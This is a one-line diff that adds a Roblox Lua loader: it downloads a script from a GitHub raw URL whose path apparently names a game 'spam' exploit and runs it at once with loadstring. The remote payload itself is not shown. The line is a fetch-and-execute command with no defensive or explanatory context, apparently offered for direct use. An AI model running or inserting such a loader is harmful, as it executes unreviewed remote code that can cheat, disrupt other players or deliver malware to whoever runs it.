@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/electricity-bricklayer-spam3-4ofwhc9wl4r2zc.lua"))()
